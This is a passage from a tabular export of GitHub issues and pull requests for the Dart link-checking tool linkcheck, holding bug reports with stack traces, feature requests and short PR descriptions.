#25     _RawReceivePortImpl._handleMessage (dart:isolate/runtime/libisolate_patch.dart:171:12)
97Unhandled exception:
NoSuchMethodError: The getter 'primaryType' was called on null.
Receiver: null
Tried calling: primaryType
#0      Object.noSuchMethod (dart:core/runtime/libobject_patch.dart:50:5)
#1      DestinationResult.updateFromResponse (package:linkcheck/src/destination.dart:327:48)
#2      checkPage (package:linkcheck/src/worker/worker.dart:127:11)
<asynchronous suspension>
#3      worker.<anonymous closure> (package:linkcheck/src/worker/worker.dart:192:29)
<asynchronous suspension>
#4      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#5      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#6      _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#7      _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#8      _StreamController._add (dart:async/stream_controller.dart:640:7)
#9      _StreamController.add (dart:async/stream_controller.dart:586:5)
#10     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#11     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#12     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#13     _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#14     _StreamController._add (dart:async/stream_controller.dart:640:7)
#15     _StreamController.add (dart:async/stream_controller.dart:586:5)
#16     _StreamSinkWrapper.add (dart:async/stream_controller.dart:858:13)
#17     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#18     CastStreamSubscription._onData (dart:_internal/async_cast.dart:81:11)
#19     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#20     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#21     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#22     _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#23     _StreamController._add (dart:async/stream_controller.dart:640:7)
#24     _StreamController.add (dart:async/stream_controller.dart:586:5)
#25     _RawReceivePortImpl._handleMessage (dart:isolate/runtime/libisolate_patch.dart:171:12)
102
^C
Ctrl-C Terminating crawl.
",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/35/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/35/comments,https://api.github.com/repos/filiph/linkcheck/issues/35/events,https://github.com/filiph/linkcheck/issues/35,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/34,401055610,MDU6SXNzdWU0MDEwNTU2MTA=,34,A lot of connection failed,7255473,open,FALSE,919717,NA,10,2019-01-20T02:29:36Z,2020-09-09T17:06:18Z,NA,NONE,NA,"Hi
It seems that when executing linkcheck against https://daemons.it, some link won't be validated even when triying more than once. That link changes from one execution to other.

I'm using the dockerfile, if it helps. If I can add more information, just ask.

Thanks for your work, this program is awesome!",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/34/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/34/comments,https://api.github.com/repos/filiph/linkcheck/issues/34/events,https://github.com/filiph/linkcheck/issues/34,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/33,391723231,MDU6SXNzdWUzOTE3MjMyMzE=,33,Unhandled exception,25686502,open,FALSE,919717,NA,2,2018-12-17T13:56:10Z,2019-05-27T21:02:57Z,NA,NONE,NA,"Hi and thanks for this tool, it seems useful! 

## Env

- MacOs Mojave
- Dart and Linkcheck installed as recommended on the repo's readme.
- Webserver started with npm `http-server` (if that matters)
## Problem

I'm running a local webserver with 4 folders at the root, and my index file. I expect the whole server to contain around 10 broken link (tested with other tools). 

When I check with linkcheck, I get the following output:

```
Crawling: 2Unhandled exception:
NoSuchMethodError: The getter 'primaryType' was called on null.
Receiver: null
Tried calling: primaryType
#0      Object.noSuchMethod (dart:core/runtime/libobject_patch.dart:50:5)
#1      DestinationResult.updateFromResponse (package:linkcheck/src/destination.dart:327:48)
#2      checkPage (package:linkcheck/src/worker/worker.dart:127:11)
<asynchronous suspension>
#3      worker.<anonymous closure> (package:linkcheck/src/worker/worker.dart:192:29)
<asynchronous suspension>
#4      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#5      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#6      _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#7      _SyncStreamController._sendData (dart:async/stream_controller.dart:763:19)
#8      _StreamController._add (dart:async/stream_controller.dart:639:7)
#9      _StreamController.add (dart:async/stream_controller.dart:585:5)
#10     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#11     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#12     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#13     _SyncStreamController._sendData (dart:async/stream_controller.dart:763:19)
#14     _StreamController._add (dart:async/stream_controller.dart:639:7)
#15     _StreamController.add (dart:async/stream_controller.dart:585:5)
#16     _StreamSinkWrapper.add (dart:async/stream_controller.dart:858:13)
#17     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#18     CastStreamSubscription._onData (dart:_internal/async_cast.dart:81:11)
#19     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#20     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#21     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#22     _SyncStreamController._sendData (dart:async/stream_controller.dart:763:19)
#23     _StreamController._add (dart:async/stream_controller.dart:639:7)
#24     _StreamController.add (dart:async/stream_controller.dart:585:5)
#25     _RawReceivePortImpl._handleMessage (dart:isolate/runtime/libisolate_patch.dart:171:12)
Unhandled exception:
NoSuchMethodError: The getter 'primaryType' was called on null.
Receiver: null
Tried calling: primaryType
#0      Object.noSuchMethod (dart:core/runtime/libobject_patch.dart:50:5)
#1      DestinationResult.updateFromResponse (package:linkcheck/src/destination.dart:327:48)
#2      checkPage (package:linkcheck/src/worker/worker.dart:127:11)
<asynchronous suspension>
#3      worker.<anonymous closure> (package:linkcheck/src/worker/worker.dart:192:29)
<asynchronous suspension>
#4      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#5      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#6      _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#7      _SyncStreamController._sendData (dart:async/stream_controller.dart:763:19)
#8      _StreamController._add (dart:async/stream_controller.dart:639:7)
#9      _StreamController.add (dart:async/stream_controller.dart:585:5)
#10     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#11     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#12     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#13     _SyncStreamController._sendData (dart:async/stream_controller.dart:763:19)
#14     _StreamController._add (dart:async/stream_controller.dart:639:7)
#15     _StreamController.add (dart:async/stream_controller.dart:585:5)
#16     _StreamSinkWrapper.add (dart:async/stream_controller.dart:858:13)
#17     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#18     CastStreamSubscription._onData (dart:_internal/async_cast.dart:81:11)
#19     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#20     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#21     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#22     _SyncStreamController._sendData (dart:async/stream_controller.dart:763:19)
#23     _StreamController._add (dart:async/stream_controller.dart:639:7)
#24     _StreamController.add (dart:async/stream_controller.dart:585:5)
#25     _RawReceivePortImpl._handleMessage (dart:isolate/runtime/libisolate_patch.dart:171:12)
(repeat the same exception)
```

But the CLI still runs! After waiting a couple of minutes, I get :
```
Errors. Checked 4892 links, 161 destination URLs (82 ignored), 93 have errors, 0 have warnings.
```
Which is not correct, but... it runs.

Any idea?",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/33/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/33/comments,https://api.github.com/repos/filiph/linkcheck/issues/33/events,https://github.com/filiph/linkcheck/issues/33,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/32,384958576,MDExOlB1bGxSZXF1ZXN0MjM0MDM4OTc4,32,Add support for --connection-failures-as-warnings flag,4140793,closed,FALSE,NA,NA,1,2018-11-27T19:50:49Z,2018-11-29T21:13:27Z,2018-11-29T21:10:41Z,COLLABORATOR,NA,"Offers a solution to #29.

cc @kwalrath @sfshaza2",NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/32/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/32/comments,https://api.github.com/repos/filiph/linkcheck/issues/32/events,https://github.com/filiph/linkcheck/pull/32,https://api.github.com/repos/filiph/linkcheck/pulls/32
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/31,381698079,MDExOlB1bGxSZXF1ZXN0MjMxNjA3MjUx,31,Fix checking of fragments with non-ASCII chars,919717,closed,FALSE,NA,NA,2,2018-11-16T17:45:26Z,2018-11-16T17:50:42Z,2018-11-16T17:50:36Z,OWNER,NA,Fixes https://github.com/filiph/linkcheck/issues/29,NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/31/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/31/comments,https://api.github.com/repos/filiph/linkcheck/issues/31/events,https://github.com/filiph/linkcheck/pull/31,https://api.github.com/repos/filiph/linkcheck/pulls/31
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/30,381374290,MDU6SXNzdWUzODEzNzQyOTA=,30,"External link checking results in exception: ""Invalid argument(s): Truncated URI""",4140793,closed,FALSE,NA,NA,2,2018-11-15T22:54:26Z,2018-11-27T19:49:02Z,2018-11-27T19:49:02Z,COLLABORATOR,NA,"For the full log, see https://travis-ci.org/flutter/website/jobs/455734598. Here is an excerpt:

```
pub run linkcheck --external --skip-file ./tool/config/linkcheck-skip-list.txt :4002 (logging to /home/travis/tmp/linkcheck-log.txt)
Crawling...
Unhandled exception:
Invalid argument(s): Truncated URI
#0      _Uri._uriDecode (dart:core/uri.dart:2850:13)
#1      Uri.decodeComponent (dart:core/uri.dart:1115:17)
#2      parseHtml.<anonymous closure> (package:linkcheck/src/parsers/html.dart:82:30)
#3      MappedListIterable.elementAt (dart:_internal/iterable.dart:414:29)
#4      ListIterable.toList (dart:_internal/iterable.dart:219:19)
#5      parseHtml (package:linkcheck/src/parsers/html.dart:83:8)
#6      checkPage (package:linkcheck/src/worker/worker.dart:168:10)
<asynchronous suspension>
#7      worker.<anonymous closure> (package:linkcheck/src/worker/worker.dart:192:29)
<asynchronous suspension>
#8      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#9      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#10     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#11     _SyncStreamController._sendData (dart:async/stream_controller.dart:763:19)
#12     _StreamController._add (dart:async/stream_controller.dart:639:7)
#13     _StreamController.add (dart:async/stream_controller.dart:585:5)
#14     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#15     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#16     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#17     _SyncStreamController._sendData (dart:async/stream_controller.dart:763:19)
#18     _StreamController._add (dart:async/stream_controller.dart:639:7)
#19     _StreamController.add (dart:async/stream_controller.dart:585:5)
#20     _StreamSinkWrapper.add (dart:async/stream_controller.dart:858:13)
#21     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#22     CastStreamSubscription._onData (dart:_internal/async_cast.dart:81:11)
#23     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#24     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#25     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#26     _SyncStreamController._sendData (dart:async/stream_controller.dart:763:19)
#27     _StreamController._add (dart:async/stream_controller.dart:639:7)
#28     _StreamController.add (dart:async/stream_controller.dart:585:5)
#29     _RawReceivePortImpl._handleMessage (dart:isolate/runtime/libisolate_patch.dart:171:12)
...
```

cc @kwalrath @sfshaza2",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/30/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/30/comments,https://api.github.com/repos/filiph/linkcheck/issues/30/events,https://github.com/filiph/linkcheck/issues/30,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/29,371736297,MDU6SXNzdWUzNzE3MzYyOTc=,29,valid links reported as  (connection failed) consistently,10676103,closed,FALSE,919717,NA,2,2018-10-18T22:20:53Z,2018-11-16T17:56:15Z,2018-11-16T17:50:36Z,NONE,NA,"Any idea why these valid links fail to validate consistently?

```
linkcheck -e docs-dev.fast.ai/style.html

http://docs-dev.fast.ai/style.html
- (336:189) 'APL' => https://en.wikipedia.org/wiki/APL_(programming_language) (connection failed)
- (347:63) 'Iverson’s' => https://en.wikipedia.org/wiki/Kenneth_E._Iverson (connection failed)
```
running in debug mode I get:

```
Killing unresponsive Worker<0>
Done checking: https://en.wikipedia.org/wiki/APL_(programming_language) (connection failed) => 0 links
- BROKEN
Killing unresponsive Worker<2>
Done checking: https://en.wikipedia.org/wiki/Kenneth_E._Iverson (connection failed) => 0 links
- BROKEN
```

There is handful of other links to wikipedia on the same page and they all work. I double-checked manually that they work if I click on them.

Strangely there are 3 almost identical links:

```
https://en.wikipedia.org/wiki/APL_(programming_language)
https://en.wikipedia.org/wiki/J_(programming_language)
https://en.wikipedia.org/wiki/K_(programming_language)
```

and only the first out of 3 doesn't validate.
",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/29/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/29/comments,https://api.github.com/repos/filiph/linkcheck/issues/29/events,https://github.com/filiph/linkcheck/issues/29,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/28,371678926,MDU6SXNzdWUzNzE2Nzg5MjY=,28,Install doc - finding pub,10676103,open,FALSE,NA,NA,0,2018-10-18T19:33:29Z,2018-10-18T19:33:29Z,NA,NONE,NA,"Hi,

I installed dart following the instructions from your linux link https://www.dartlang.org/install/linux, and then:

`$ pub global activate linkcheck
Command 'pub' not found
`

Checking the dart .deb package, it puts its bins under `/usr/lib/dart/bin/` which is of course is not in my `PATH`, so it might be useful to add a note helping the user to find `pub`.

Thanks.
",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/28/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/28/comments,https://api.github.com/repos/filiph/linkcheck/issues/28/events,https://github.com/filiph/linkcheck/issues/28,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/27,368126767,MDU6SXNzdWUzNjgxMjY3Njc=,27,Skip patterns are ignored for external links,4140793,closed,FALSE,NA,NA,5,2018-10-09T09:46:48Z,2018-11-13T21:28:57Z,2018-11-13T21:28:57Z,COLLABORATOR,NA,"For example, the following skip pattern:

    forum/flutter-dev

seems to be ignored for the external link `https://groups.google.com/forum/#!forum/flutter-dev`:

```nocode
http://localhost:4002/tos
- (807:12) 'flutter-..' => https://groups.google.com/forum/#!forum/flutter-dev (HTTP 200 but missing anchor)
```

cc @Sfshaza",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/27/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/27/comments,https://api.github.com/repos/filiph/linkcheck/issues/27/events,https://github.com/filiph/linkcheck/issues/27,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/26,365652198,MDU6SXNzdWUzNjU2NTIxOTg=,26,Include cookies or headers,587527,open,FALSE,NA,NA,1,2018-10-01T21:33:05Z,2019-12-06T20:23:53Z,NA,NONE,NA,I'd like a way to include cookies or custom headers in requests. I sometimes need to linkcheck authenticated URLs and it doesn't look like linkcheck supports this yet.,NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/26/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/26/comments,https://api.github.com/repos/filiph/linkcheck/issues/26/events,https://github.com/filiph/linkcheck/issues/26,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/25,362398893,MDExOlB1bGxSZXF1ZXN0MjE3MTMwNTUy,25,Docker doc improvements,6686047,closed,FALSE,NA,NA,0,2018-09-20T23:03:49Z,2018-09-20T23:13:02Z,2018-09-20T23:13:01Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/25/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/25/comments,https://api.github.com/repos/filiph/linkcheck/issues/25/events,https://github.com/filiph/linkcheck/pull/25,https://api.github.com/repos/filiph/linkcheck/pulls/25
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/24,362349217,MDExOlB1bGxSZXF1ZXN0MjE3MDk0MzI0,24,Add Dockerfile,6686047,closed,FALSE,NA,NA,5,2018-09-20T20:18:19Z,2018-09-20T23:03:22Z,2018-09-20T22:33:13Z,CONTRIBUTOR,NA,"I've added a simple Dockerfile to execute the project.

The major justification is that I generally don't like to create all the setup of a project just to do a test or a simple use case.

Another great justification to have a Dockerfile is to prevent setup issues and have an alternative to run this project.

In my case, beyond of the setup usage, I want to put this project on my CD to do a post-deploy check of all the URLs of a staging project.",NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/24/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/24/comments,https://api.github.com/repos/filiph/linkcheck/issues/24/events,https://github.com/filiph/linkcheck/pull/24,https://api.github.com/repos/filiph/linkcheck/pulls/24
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/23,361858939,MDU6SXNzdWUzNjE4NTg5Mzk=,23,linkcheck should ignore robots.txt on localhost,919717,closed,FALSE,NA,NA,2,2018-09-19T17:53:17Z,2018-09-19T21:45:34Z,2018-09-19T21:44:57Z,OWNER,NA,"I'm pretty sure I implemented this feature but @chalin reports that it isn't working (i.e. `linkcheck` conforms to `robots.txt` even on localhost / 127.0.0.1). 

So either I'm remembering wrong, or there's a bug.",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/23/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/23/comments,https://api.github.com/repos/filiph/linkcheck/issues/23/events,https://github.com/filiph/linkcheck/issues/23,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/22,359584011,MDU6SXNzdWUzNTk1ODQwMTE=,22,Parameter to ignore robots.txt,6686047,closed,FALSE,NA,NA,3,2018-09-12T17:40:50Z,2018-09-19T22:26:55Z,2018-09-19T17:58:28Z,CONTRIBUTOR,NA,"Congratulations by the project, this is awesome.

I'm having a specific use case with this project: I have a staging web project that I don't want it to be indexed by the google. In other words, my robots.txt have one rule to ignore all links, and in this case, I can't use the linkcheck to check that.

Would be great have a parameter that says I don't want to honors the robots.txt.",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/22/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/22/comments,https://api.github.com/repos/filiph/linkcheck/issues/22/events,https://github.com/filiph/linkcheck/issues/22,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/21,357861761,MDU6SXNzdWUzNTc4NjE3NjE=,21,unable to connect to https://localhost,1234634,open,FALSE,NA,NA,2,2018-09-06T23:11:54Z,2018-09-08T01:46:02Z,NA,NONE,NA,"The only message is ""connection failed"". It's a self-signed certificate, for other similar utilities I have to turn off certificate checking in some fashion. I can crawl the live public version of the same site, which has a valid cert, so I'd guess that's some part of the problem.",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/21/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/21/comments,https://api.github.com/repos/filiph/linkcheck/issues/21/events,https://github.com/filiph/linkcheck/issues/21,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/20,357293156,MDU6SXNzdWUzNTcyOTMxNTY=,20,Kills Linux System Memory Runaway ,41482601,closed,FALSE,NA,NA,4,2018-09-05T15:49:20Z,2018-09-05T17:20:43Z,2018-09-05T16:57:39Z,NONE,NA,"Tried linkcheck out on my system:
Operating System: Linux Mint 19  
Kernel: Linux 4.15.0-33-generic  
Architecture: x86-64  
4 GHz i5-8300H  
15GB RAM   
Dart VM version: 2.0.0  
Pub 2.0.0  
linkcheck version 2.0.4  

Both times I tried it, it crashed my system. Both times was to try and find all dead links on a company website. When i ran`linkcheck <privateURL>` system resources were at 3GB RAM with Load of less than 0.5. After about 700 links my CPU fans were going nuts and RAM was at 10GB in use. By 1200 links, RAM was maxed out at 15GB with an additional 2.5GB of SWAP. By 2193 links RAM still maxed out and SWAP was at 5.25GB and then whole system locked up. UI stopped responding and I could not do anything. I waited 8 minuets the last time after UI lock up before hard shutdown.

Has anybody tested this on a Linux system? ",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/20/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/20/comments,https://api.github.com/repos/filiph/linkcheck/issues/20/events,https://github.com/filiph/linkcheck/issues/20,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/19,348141550,MDU6SXNzdWUzNDgxNDE1NTA=,19,Can't save output to text file.,24916520,open,FALSE,NA,NA,5,2018-08-07T02:17:20Z,2018-08-09T06:28:41Z,NA,NONE,NA,"First off, thanks for the tool. Trying to use it for the first time, but cannot get past the problem below...

If I run:
   linkcheck www.nobleprog.co.uk
...it runs fine.

If I run:
   linkcheck www.nobleprog.co.uk > list.log
...it gets stuck on:
   ""Crawling...""

I've tried many times on different days, different servers, using different domain names, different log file names, switches such as 2>&1, all to no avail.

Any ideas?

--Daniel
",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/19/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/19/comments,https://api.github.com/repos/filiph/linkcheck/issues/19/events,https://github.com/filiph/linkcheck/issues/19,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/18,347929919,MDExOlB1bGxSZXF1ZXN0MjA2NDAzNTM3,18,"Set min SDK to 2.0.0, and clean up `.travis.yml`",4140793,closed,FALSE,NA,NA,2,2018-08-06T13:44:03Z,2018-08-06T16:36:47Z,2018-08-06T16:32:13Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/18/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/18/comments,https://api.github.com/repos/filiph/linkcheck/issues/18/events,https://github.com/filiph/linkcheck/pull/18,https://api.github.com/repos/filiph/linkcheck/pulls/18
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/17,341193180,MDExOlB1bGxSZXF1ZXN0MjAxNDI1OTQ2,17,chore: set max SDK version to <3.0.0,4140793,closed,FALSE,NA,NA,1,2018-07-14T00:27:45Z,2018-07-18T14:22:30Z,2018-07-18T14:22:24Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/17/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/17/comments,https://api.github.com/repos/filiph/linkcheck/issues/17/events,https://github.com/filiph/linkcheck/pull/17,https://api.github.com/repos/filiph/linkcheck/pulls/17
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/16,335008664,MDExOlB1bGxSZXF1ZXN0MTk2ODM3NDIy,16,Workaround to SDK canonicalization issue,4140793,closed,FALSE,NA,NA,2,2018-06-22T20:26:38Z,2018-06-24T21:04:08Z,2018-06-22T20:31:40Z,COLLABORATOR,NA,"Trivial code tweak to avoid triggering canonicalization issue https://github.com/dart-lang/sdk/issues/33430

cc @kevmoo @kwalrath ",NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/16/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/16/comments,https://api.github.com/repos/filiph/linkcheck/issues/16/events,https://github.com/filiph/linkcheck/pull/16,https://api.github.com/repos/filiph/linkcheck/pulls/16
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/15,333071370,MDU6SXNzdWUzMzMwNzEzNzA=,15,Bad state: No element,776740,open,FALSE,NA,NA,1,2018-06-17T15:34:47Z,2018-06-17T16:54:16Z,NA,NONE,NA,"This is the output I got and it asked me to create an issue with this.
What i am trying to do is take a list of URL's from a file as input and check them for 404. The command is: linkcheck.bat -e -i 1.csv > sanitize1.txt",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/15/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/15/comments,https://api.github.com/repos/filiph/linkcheck/issues/15/events,https://github.com/filiph/linkcheck/issues/15,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/14,332787535,MDExOlB1bGxSZXF1ZXN0MTk1MTg0OTMy,14,Add CHANGELOG.md,4140793,closed,FALSE,NA,NA,1,2018-06-15T14:05:52Z,2018-06-15T14:10:54Z,2018-06-15T14:10:50Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/14/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/14/comments,https://api.github.com/repos/filiph/linkcheck/issues/14/events,https://github.com/filiph/linkcheck/pull/14,https://api.github.com/repos/filiph/linkcheck/pulls/14
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/13,331699627,MDExOlB1bGxSZXF1ZXN0MTk0MzY2NTMw,13,Upgrade to Dart 2,4140793,closed,FALSE,NA,NA,10,2018-06-12T18:20:16Z,2018-06-15T18:15:37Z,2018-06-15T12:29:15Z,COLLABORATOR,NA,cc @kwalrath @kevmoo,NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/13/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/13/comments,https://api.github.com/repos/filiph/linkcheck/issues/13/events,https://github.com/filiph/linkcheck/pull/13,https://api.github.com/repos/filiph/linkcheck/pulls/13
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/12,331589103,MDU6SXNzdWUzMzE1ODkxMDM=,12,Can't pub activate as of 2.0.0-dev.61 w/ --preview-dart-2,4140793,closed,FALSE,NA,NA,1,2018-06-12T13:31:58Z,2018-08-27T19:06:07Z,2018-08-27T19:06:06Z,COLLABORATOR,NA,"```console
> export DART_VM_OPTIONS=--preview-dart-2
> pub global activate linkcheck
Package linkcheck is currently active at version 1.0.6.
Resolving dependencies... (2.0s)
+ args 0.13.7 (1.4.3 available)
+ async 2.0.7
+ charcode 1.1.1
+ collection 1.14.9
+ console 2.2.4
...
+ vector_math 1.4.7 (2.0.7 available)
Precompiling executables... (1.1s)
Failed to precompile linkcheck:linkcheck:
file:///Users/chalin/.pub-cache/hosted/pub.dartlang.org/console-2.2.4/lib/src/base.dart:216:40: Error: A value of type 'dart.core::List<dynamic>' can't be assigned to a variable of type 'dart.core::Iterable<dart.core::int>'.
Try changing the type of the left hand side, or casting the right hand side to 'dart.core::Iterable<dart.core::int>'.
    var str = new String.fromCharCodes(bytes);
                                       ^
file:///Users/chalin/.pub-cache/hosted/pub.dartlang.org/console-2.2.4/lib/src/canvas.dart:27:18: Error: A value of type 'console::PixelSpec' can't be assigned to a variable of type 'dart.core::int'.
Try changing the type of the left hand side, or casting the right hand side to 'dart.core::int'.
      spec = new PixelSpec(color: spec);
                 ^
file:///Users/chalin/.pub-cache/hosted/pub.dartlang.org/console-2.2.4/lib/src/canvas.dart:33:20: Error: A value of type 'dart.core::int' can't be assigned to a variable of type 'console::PixelSpec'.
Try changing the type of the left hand side, or casting the right hand side to 'console::PixelSpec'.
    pixels[x][y] = spec;
                   ^
file:///Users/chalin/.pub-cache/hosted/pub.dartlang.org/console-2.2.4/lib/clut.dart:4:4: Error: A value of type 'dart.core::int' can't be assigned to a variable of type 'dart.core::String'.
Try changing the type of the left hand side, or casting the right hand side to 'dart.core::String'.
  [0, '000000'],
   ^
file:///Users/chalin/.pub-cache/hosted/pub.dartlang.org/console-2.2.4/lib/clut.dart:5:4: Error: A value of type 'dart.core::int' can't be assigned to a variable of type 'dart.core::String'.
Try changing the type of the left hand side, or casting the right hand side to 'dart.core::String'.
  [1, '800000'],
   ^
file:///Users/chalin/.pub-cache/hosted/pub.dartlang.org/console-2.2.4/lib/clut.dart:6:4: Error: A value of type 'dart.core::int' can't be assigned to a variable of type 'dart.core::String'.
Try changing the type of the left hand side, or casting the right hand side to 'dart.core::String'.
  [2, '008000'],
   ^
file:///Users/chalin/.pub-cache/hosted/pub.dartlang.org/console-2.2.4/lib/clut.dart:7:4: Error: A value of type 'dart.core::int' can't be assigned to a variable of type 'dart.core::String'.
Try changing the type of the left hand side, or casting the right hand side to 'dart.core::String'.
  [3, '808000'],
   ^
